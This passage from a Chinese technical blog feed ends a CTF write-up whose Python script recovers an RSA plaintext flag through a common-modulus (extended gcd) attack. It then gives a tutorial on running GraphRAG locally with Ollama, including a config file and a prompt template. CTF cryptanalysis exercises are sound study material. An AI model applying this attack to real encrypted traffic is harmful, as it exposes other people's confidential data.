exp2 * y</span></span><br><span class="line">gcd1, coeff_x1, coeff_y1 = gcdext(exp1, exp2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解出 intermediate_m1，即 cipher1^x * cipher2^y mod n</span></span><br><span class="line"><span class="comment"># intermediate_m1 相当于 m 的 1016231455597 次幂模 n 的结果</span></span><br><span class="line">intermediate_m1 = <span class="built_in">pow</span>(cipher1, coeff_x1, n) * <span class="built_in">pow</span>(cipher2, coeff_y1, n) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二组公钥指数</span></span><br><span class="line">exp3 = <span class="number">1009755935113158588369659</span> // <span class="number">993627907847</span>  </span><br><span class="line">exp4 = <span class="number">897161019325217314301779</span> // <span class="number">993627907847</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用扩展欧几里得算法计算 exp3 和 exp4 的最大公约数 gcd2，以及贝祖系数 x2 和 y2</span></span><br><span class="line"><span class="comment"># gcd2 是 exp3 和 exp4 的最大公约数，x2 和 y2 是贝祖系数，使得 gcd2 = exp3 * x2 + exp4 * y2</span></span><br><span class="line">gcd2, coeff_x2, coeff_y2 = gcdext(exp3, exp4)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解出 intermediate_m2，即 cipher1^x2 * flag3^y2 mod n</span></span><br><span class="line"><span class="comment"># intermediate_m2 相当于 m 的 993627907847 次幂模 n 的结果</span></span><br><span class="line">intermediate_m2 = <span class="built_in">pow</span>(cipher1, coeff_x2, n) * <span class="built_in">pow</span>(flag3, coeff_y2, n) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于组合两个解密结果的公钥指数</span></span><br><span class="line">exp_final1 = <span class="number">1016231455597</span>  <span class="comment"># 原来的 eee1</span></span><br><span class="line">exp_final2 = <span class="number">993627907847</span>  <span class="comment"># 原来的 eee2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用扩展欧几里得算法计算 exp_final1 和 exp_final2 的最大公约数 gcd_final，以及贝祖系数 x_final 和 y_final</span></span><br><span class="line"><span class="comment"># gcd_final 是 exp_final1 和 exp_final2 的最大公约数，x_final 和 y_final 是贝祖系数，使得 gcd_final = exp_final1 * x_final + exp_final2 * y_final</span></span><br><span class="line">gcd_final, coeff_x_final, coeff_y_final = gcdext(exp_final1, exp_final2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终解密结果，将 intermediate_m1 和 intermediate_m2 的组合计算得到明文 m</span></span><br><span class="line"><span class="comment"># 这里解密过程使用了 m1 和 m2 的贝祖组合，通过 m1^x_final * m2^y_final mod n 得到 m</span></span><br><span class="line">final_message = <span class="built_in">pow</span>(intermediate_m1, coeff_x_final, n) * <span class="built_in">pow</span>(intermediate_m2, coeff_y_final, n) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解密后的整数转换为字符串形式的明文</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(final_message))</span><br></pre></td></tr></table></figure><p><img src="/img/CTF/ezCMA.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flag </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>知识图谱</title>
      <link href="/2024/10/10/Summary/"/>
      <url>/2024/10/10/Summary/</url>
      
        <content type="html"><![CDATA[<h1 id="工作总结"><a href="#工作总结" class="headerlink" title="工作总结"></a>工作总结</h1><ul><li><a href="#%E5%B7%A5%E4%BD%9C%E6%80%BB%E7%BB%93">工作总结</a><ul><li><a href="#1graphrag%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2">1.GraphRAG本地部署</a><ul><li><a href="#11%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE">1.1基础配置</a></li><li><a href="#12%E4%BD%BF%E7%94%A8ollamallama%E8%BF%9B%E8%A1%8C%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2">1.2使用Ollama+llama进行本地部署</a></li><li><a href="#13%E4%BD%BF%E7%94%A8deepseek%E5%A4%A7%E6%A8%A1%E5%9E%8B%E8%BF%9B%E8%A1%8C%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2">1.3使用deepseek大模型进行本地部署</a></li><li><a href="#14-%E5%AF%B9graphrag%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90">1.4 对GraphRAG的工作流程简单分析</a></li></ul></li><li><a href="#2-neo4j%E5%8F%AF%E8%A7%86%E5%8C%96%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1">2. Neo4j可视化知识图谱</a><ul><li><a href="#21-neo4j%E9%83%A8%E7%BD%B2">2.1 Neo4j部署</a></li><li><a href="#22-%E5%B0%86graphrag%E8%BF%9B%E8%A1%8C%E5%8F%AF%E8%A7%86%E5%8C%96%E6%93%8D%E4%BD%9C">2.2 将GraphRAG进行可视化操作</a></li><li><a href="#23-%E8%87%AA%E8%A1%8C%E5%88%9B%E5%BB%BA%E7%AE%80%E5%8D%95%E5%9B%BE%E8%B0%B1%E7%A4%BA%E4%BE%8B">2.3 自行创建简单图谱示例</a></li><li><a href="#24-%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E6%9E%84%E5%BB%BA%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90">2.4 知识图谱构建案例分析</a><ul><li><a href="#241-%E7%BA%A2%E6%A5%BC%E6%A2%A6%E4%BA%BA%E7%89%A9%E5%85%B3%E7%B3%BB%E5%9B%BE%E8%B0%B1%E6%9E%84%E5%BB%BA">2.4.1 红楼梦人物关系图谱构建</a></li><li><a href="#242-%E5%80%9F%E5%8A%A9ai%E5%A4%A7%E6%A8%A1%E5%9E%8B%E8%BF%9B%E8%A1%8C%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E6%9E%84%E5%BB%BA">2.4.2 借助AI大模型进行知识图谱构建</a></li><li><a href="#243-%E5%8C%BB%E7%96%97%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E6%9E%84%E5%BB%BA">2.4.3 医疗知识图谱构建</a></li></ul></li></ul></li></ul></li></ul><h2 id="1-GraphRAG本地部署"><a href="#1-GraphRAG本地部署" class="headerlink" title="1.GraphRAG本地部署"></a>1.GraphRAG本地部署</h2><p>若有OpenAI密钥可直接按照<a href="https://microsoft.github.io/graphrag/posts/get_started/">graphrag官网</a>的步骤进行graphrag的本地部署和使用<br>一般用户没有OpenAI密钥可以考虑使用其他可获得的密钥或者用Ollama+llama进行本地大模型部署，需要注意的是本地大模型部署对电脑配置要求比较高，建议还是使用api接口  </p><p>以下讲解GraphRAG在不用OpenAI密钥的情况下的部署</p><h3 id="1-1基础配置"><a href="#1-1基础配置" class="headerlink" title="1.1基础配置"></a>1.1基础配置</h3><p>创建项目graphrag（也可以取其他名称，这里方便后续说明）及相应虚拟环境，注意python版本为<strong>3.10-3.12</strong><br>安装graphrag库:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install graphrag</span><br></pre></td></tr></table></figure><p>创建目录test（也可以是其他名称，这里确定为test方便后续说明）<br>在test目录下创建目录input，在input目录下存放要进行索引构建的文本文件<br>完成后当前文件树结构为:  </p><pre><code>graphrag    └─test        └─input            └─book.txt</code></pre><p>初始化test目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m graphrag.index --init --root ./test</span><br></pre></td></tr></table></figure><p>初始化时会生成其他文件夹和文件，完成后当前文件树结构为:  </p><pre><code>graphrag    └─test        │  .env        │  settings.yaml        │        ├─input        │      book.txt        │        ├─output        │  └─20240914-170402        │      └─reports        │              indexing-engine.log        │        └─prompts                claim_extraction.txt                community_report.txt                entity_extraction.txt                summarize_descriptions.txt</code></pre><p>至此，基本配置结束</p><h3 id="1-2使用Ollama-llama进行本地部署"><a href="#1-2使用Ollama-llama进行本地部署" class="headerlink" title="1.2使用Ollama+llama进行本地部署"></a>1.2使用Ollama+llama进行本地部署</h3><p>可以参考<a href="https://www.bilibili.com/video/BV18HeFetELw/?spm_id_from=333.337.search-card.all.click&vd_source=4966528acd6540678eedd7b9e188a2d1">b站视频</a><br>笔者也是通过该视频完成了Ollama+llama本地部署graphrag<br>Ollama官网:<a href="https://ollama.com/">https://ollama.com/</a>  </p><p><strong>Ollama相关命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama pull llama3.1 <span class="comment"># 拉取模型</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run llama3.1 <span class="comment"># 运行模型</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama serve <span class="comment"># 开启服务</span></span><br></pre></td></tr></table></figure><p><em><strong>相关文件</strong></em><br>该视频已给出<a href="https://pan.baidu.com/s/1li35HD80IulxJntWcI9DFw?pwd=s53j">文件百度网盘下载地址</a>，也可以直接复制粘贴此处已下好的文件内容</p><p>settings.yaml:  </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">encoding_model:</span> <span class="string">cl100k_base</span></span><br><span class="line"><span class="attr">skip_workflows:</span> []</span><br><span class="line"><span class="attr">llm:</span></span><br><span class="line">  <span class="attr">api_key:</span> <span class="string">sk-djdjsjdj</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">openai_chat</span> <span class="comment"># or azure_openai_chat</span></span><br><span class="line">  <span class="comment">#model: glm4:9b-chat-q6_K</span></span><br><span class="line">  <span class="attr">model:</span> <span class="string">llama3.1</span></span><br><span class="line">  <span class="attr">model_supports_json:</span> <span class="literal">true</span> <span class="comment"># recommended if this is available for your model.</span></span><br><span class="line">  <span class="comment"># max_tokens: 4000</span></span><br><span class="line">  <span class="comment"># request_timeout: 180.0</span></span><br><span class="line">  <span class="attr">api_base:</span> <span class="string">http://localhost:11434/v1</span></span><br><span class="line">  <span class="comment"># api_version: 2024-02-15-preview</span></span><br><span class="line">  <span class="comment"># organization: &lt;organization_id&gt;</span></span><br><span class="line">  <span class="comment"># deployment_name: &lt;azure_model_deployment_name&gt;</span></span><br><span class="line">  <span class="comment"># tokens_per_minute: 150_000 # set a leaky bucket throttle</span></span><br><span class="line">  <span class="comment"># requests_per_minute: 10_000 # set a leaky bucket throttle</span></span><br><span class="line">  <span class="comment"># max_retries: 10</span></span><br><span class="line">  <span class="comment"># max_retry_wait: 10.0</span></span><br><span class="line">  <span class="comment"># sleep_on_rate_limit_recommendation: true # whether to sleep when azure suggests wait-times</span></span><br><span class="line">  <span class="comment"># concurrent_requests: 25 # the number of parallel inflight requests that may be made</span></span><br><span class="line"></span><br><span class="line"><span class="attr">parallelization:</span></span><br><span class="line">  <span class="attr">stagger:</span> <span class="number">0.3</span></span><br><span class="line">  <span class="comment"># num_threads: 50 # the number of threads to use for parallel processing</span></span><br><span class="line"></span><br><span class="line"><span class="attr">async_mode:</span> <span class="string">threaded</span> <span class="comment"># or asyncio</span></span><br><span class="line"></span><br><span class="line"><span class="attr">embeddings:</span></span><br><span class="line">  <span class="comment">## parallelization: override the global parallelization settings for embeddings</span></span><br><span class="line">  <span class="attr">async_mode:</span> <span class="string">threaded</span> <span class="comment"># or asyncio</span></span><br><span class="line">  <span class="attr">llm:</span></span><br><span class="line">    <span class="attr">api_key:</span> <span class="string">sk-djdjsjdj</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">openai_embedding</span> <span class="comment"># or azure_openai_embedding</span></span><br><span class="line">    <span class="attr">model:</span> <span class="string">nomic-embed-text</span></span><br><span class="line">    <span class="comment">#model: nomic_embed_text</span></span><br><span class="line">    <span class="attr">api_base:</span> <span class="string">http://localhost:11434/api</span></span><br><span class="line">    <span class="comment">#api_base: http://localhost:11434/v1</span></span><br><span class="line">    <span class="comment"># api_version: 2024-02-15-preview</span></span><br><span class="line">    <span class="comment"># organization: &lt;organization_id&gt;</span></span><br><span class="line">    <span class="comment"># deployment_name: &lt;azure_model_deployment_name&gt;</span></span><br><span class="line">    <span class="comment"># tokens_per_minute: 150_000 # set a leaky bucket throttle</span></span><br><span class="line">    <span class="comment"># requests_per_minute: 10_000 # set a leaky bucket throttle</span></span><br><span class="line">    <span class="comment"># max_retries: 10</span></span><br><span class="line">    <span class="comment"># max_retry_wait: 10.0</span></span><br><span class="line">    <span class="comment"># sleep_on_rate_limit_recommendation: true # whether to sleep when azure suggests wait-times</span></span><br><span class="line">    <span class="comment"># concurrent_requests: 25 # the number of parallel inflight requests that may be made</span></span><br><span class="line">    <span class="comment"># batch_size: 16 # the number of documents to send in a single request</span></span><br><span class="line">    <span class="comment"># batch_max_tokens: 8191 # the maximum number of tokens to send in a single request</span></span><br><span class="line">    <span class="comment"># target: required # or optional</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">chunks:</span></span><br><span class="line">  <span class="attr">size:</span> <span class="number">300</span></span><br><span class="line">  <span class="attr">overlap:</span> <span class="number">100</span></span><br><span class="line">  <span class="attr">group_by_columns:</span> [<span class="string">id</span>] <span class="comment"># by default, we don&#x27;t allow chunks to cross documents</span></span><br><span class="line">    </span><br><span class="line"><span class="attr">input:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">file</span> <span class="comment"># or blob</span></span><br><span class="line">  <span class="attr">file_type:</span> <span class="string">text</span> <span class="comment"># or csv</span></span><br><span class="line">  <span class="attr">base_dir:</span> <span class="string">&quot;input&quot;</span></span><br><span class="line">  <span class="attr">file_encoding:</span> <span class="string">utf-8</span></span><br><span class="line">  <span class="attr">file_pattern:</span> <span class="string">&quot;.*\\.txt$&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">cache:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">file</span> <span class="comment"># or blob</span></span><br><span class="line">  <span class="attr">base_dir:</span> <span class="string">&quot;cache&quot;</span></span><br><span class="line">  <span class="comment"># connection_string: &lt;azure_blob_storage_connection_string&gt;</span></span><br><span class="line">  <span class="comment"># container_name: &lt;azure_blob_storage_container_name&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">storage:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">file</span> <span class="comment"># or blob</span></span><br><span class="line">  <span class="attr">base_dir:</span> <span class="string">&quot;output/$&#123;timestamp&#125;/artifacts&quot;</span></span><br><span class="line">  <span class="comment"># connection_string: &lt;azure_blob_storage_connection_string&gt;</span></span><br><span class="line">  <span class="comment"># container_name: &lt;azure_blob_storage_container_name&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">reporting:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">file</span> <span class="comment"># or console, blob</span></span><br><span class="line">  <span class="attr">base_dir:</span> <span class="string">&quot;output/$&#123;timestamp&#125;/reports&quot;</span></span><br><span class="line">  <span class="comment"># connection_string: &lt;azure_blob_storage_connection_string&gt;</span></span><br><span class="line">  <span class="comment"># container_name: &lt;azure_blob_storage_container_name&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">entity_extraction:</span></span><br><span class="line">  <span class="comment">## llm: override the global llm settings for this task</span></span><br><span class="line">  <span class="comment">## parallelization: override the global parallelization settings for this task</span></span><br><span class="line">  <span class="comment">## async_mode: override the global async_mode settings for this task</span></span><br><span class="line">  <span class="attr">prompt:</span> <span class="string">&quot;prompts/entity_extraction.txt&quot;</span></span><br><span class="line">  <span class="attr">entity_types:</span> [<span class="string">organization</span>,<span class="string">person</span>,<span class="string">geo</span>,<span class="string">event</span>]</span><br><span class="line">  <span class="attr">max_gleanings:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">summarize_descriptions:</span></span><br><span class="line">  <span class="comment">## llm: override the global llm settings for this task</span></span><br><span class="line">  <span class="comment">## parallelization: override the global parallelization settings for this task</span></span><br><span class="line">  <span class="comment">## async_mode: override the global async_mode settings for this task</span></span><br><span class="line">  <span class="attr">prompt:</span> <span class="string">&quot;prompts/summarize_descriptions.txt&quot;</span></span><br><span class="line">  <span class="attr">max_length:</span> <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="attr">claim_extraction:</span></span><br><span class="line">  <span class="comment">## llm: override the global llm settings for this task</span></span><br><span class="line">  <span class="comment">## parallelization: override the global parallelization settings for this task</span></span><br><span class="line">  <span class="comment">## async_mode: override the global async_mode settings for this task</span></span><br><span class="line">  <span class="comment"># enabled: true</span></span><br><span class="line">  <span class="attr">prompt:</span> <span class="string">&quot;prompts/claim_extraction.txt&quot;</span></span><br><span class="line">  <span class="attr">description:</span> <span class="string">&quot;Any claims or facts that could be relevant to information discovery.&quot;</span></span><br><span class="line">  <span class="attr">max_gleanings:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">community_report:</span></span><br><span class="line">  <span class="comment">## llm: override the global llm settings for this task</span></span><br><span class="line">  <span class="comment">## parallelization: override the global parallelization settings for this task</span></span><br><span class="line">  <span class="comment">## async_mode: override the global async_mode settings for this task</span></span><br><span class="line">  <span class="attr">prompt:</span> <span class="string">&quot;prompts/community_report.txt&quot;</span></span><br><span class="line">  <span class="attr">max_length:</span> <span class="number">2000</span></span><br><span class="line">  <span class="attr">max_input_length:</span> <span class="number">8000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">cluster_graph:</span></span><br><span class="line">  <span class="attr">max_cluster_size:</span> <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="attr">embed_graph:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">false</span> <span class="comment"># if true, will generate node2vec embeddings for nodes</span></span><br><span class="line">  <span class="comment"># num_walks: 10</span></span><br><span class="line">  <span class="comment"># walk_length: 40</span></span><br><span class="line">  <span class="comment"># window_size: 2</span></span><br><span class="line">  <span class="comment"># iterations: 3</span></span><br><span class="line">  <span class="comment"># random_seed: 597832</span></span><br><span class="line"></span><br><span class="line"><span class="attr">umap:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">false</span> <span class="comment"># if true, will generate UMAP embeddings for nodes</span></span><br><span class="line"></span><br><span class="line"><span class="attr">snapshots:</span></span><br><span class="line">  <span class="attr">graphml:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">raw_entities:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">top_level_nodes:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="comment"># text_unit_prop: 0.5</span></span><br><span class="line">  <span class="comment"># community_prop: 0.1</span></span><br><span class="line">  <span class="comment"># conversation_history_max_turns: 5</span></span><br><span class="line">  <span class="comment"># top_k_mapped_entities: 10</span></span><br><span class="line">  <span class="comment"># top_k_relationships: 10</span></span><br><span class="line">  <span class="comment"># max_tokens: 12000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">global_search:</span></span><br><span class="line">  <span class="comment"># max_tokens: 12000</span></span><br><span class="line">  <span class="comment"># data_max_tokens: 12000</span></span><br><span class="line">  <span class="comment"># map_max_tokens: 1000</span></span><br><span class="line">  <span class="comment"># reduce_max_tokens: 2000</span></span><br><span class="line">  <span class="comment"># concurrency: 32</span></span><br></pre></td></tr></table></figure><p>community_report.txt:  </p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">You are an AI assistant that helps a human analyst to perform general information discovery. Information discovery is the process of identifying and assessing relevant information associated with certain entities (e.g., organizations and individuals) within a network.</span><br><span class="line"></span><br><span class="line"># Goal</span><br><span class="line">Write a comprehensive report of a community, given a list of entities that belong to the community as well as their relationships and optional associated claims. The report will be used to inform decision-makers about information associated with the community and their potential impact. The content of this report includes an overview of the community&#x27;s key entities, their legal compliance, technical capabilities, reputation, and noteworthy claims.</span><br><span class="line"></span><br><span class="line"># Report Structure</span><br><span class="line"></span><br><span class="line">The report should include the following sections:</span><br><span class="line"></span><br><span class="line">- TITLE: community&#x27;s name that represents its key entities - title should be short but specific. When possible, include representative named entities in the title.</span><br><span class="line">  - SUMMARY: An executive summary of the community&#x27;s overall structure, how its entities are related to each other, and significant information associated with its entities.</span><br><span class="line">  - IMPACT SEVERITY RATING: a float score between 0-10 that represents the severity of IMPACT posed by entities within the community.  IMPACT is the scored importance of a community.</span><br><span class="line">  - RATING EXPLANATION: Give a single sentence explanation of the IMPACT severity rating.</span><br><span class="line">  - DETAILED FINDINGS: A list of 5-10 key insights about the community. Each insight should have a short summary followed by multiple paragraphs of explanatory text grounded according to the grounding rules below. Be comprehensive.</span><br><span class="line"></span><br><span class="line">Return output as a well-formed JSON-formatted string with the following format:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;title&quot;: &lt;report_title&gt;,</span><br><span class="line">        &quot;summary&quot;: &lt;executive_summary&gt;,</span><br><span class="line">        &quot;rating&quot;: &lt;impact_severity_rating&gt;,</span><br><span class="line">        &quot;rating_explanation&quot;: &lt;rating_explanation&gt;,</span><br><span class="line">        &quot;findings&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;summary&quot;:&lt;insight_1_summary&gt;,</span><br><span class="line">                &quot;explanation&quot;: &lt;insight_1_explanation&gt;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;summary&quot;:&lt;insight_2_summary&gt;,</span><br><span class="line">                &quot;explanation&quot;: &lt;insight_2_explanation&gt;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"># Grounding Rules</span><br><span class="line"></span><br><span class="line">Points supported by data should list their data references as follows:</span><br><span class="line"></span><br><span class="line">&quot;This is an example sentence supported by multiple data references [Data: &lt;dataset name&gt; (record ids); &lt;dataset name&gt; (record ids)].&quot;</span><br><span class="line"></span><br><span class="line">Do not list more than 5 record ids in a single reference. Instead, list the top 5 most relevant record ids and add &quot;+more&quot; to indicate that there are more.</span><br><span class="line"></span><br><span class="line">For example:</span><br><span class="line">&quot;Person X is the owner of Company Y and subject to many allegations of wrongdoing [Data: Reports (1), Entities (5, 7); Relationships (23); Claims (7, 2, 34, 64, 46, +more)].&quot;</span><br><span class="line"></span><br><span class="line">where 1, 5, 7, 23, 2, 34, 46, and 64 represent the id (not the index) of the relevant data record.</span><br><span class="line"></span><br><span class="line">Do not include information where the supporting evidence for it is not provided.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Example Input</span><br><span class="line">-----------</span><br><span class="line">Text:</span><br><span class="line"></span><br><span class="line">Entities</span><br><span class="line"></span><br><span class="line">id,entity,description</span><br><span class="line">5,VERDANT OASIS PLAZA,Verdant Oasis Plaza is the location of the Unity March</span><br><span class="line">6,HARMONY ASSEMBLY,Harmony Assembly is an organization that is holding a march at Verdant Oasis Plaza</span><br><span class="line"></span><br><span class="line">Relationships</span><br><span class="line"></span><br><span class="line">id,source,target,description</span><br><span class="line">37,VERDANT OASIS PLAZA,UNITY MARCH,Verdant Oasis Plaza is the location of the Unity March</span><br><span class="line">38,VERDANT OASIS PLAZA,HARMONY 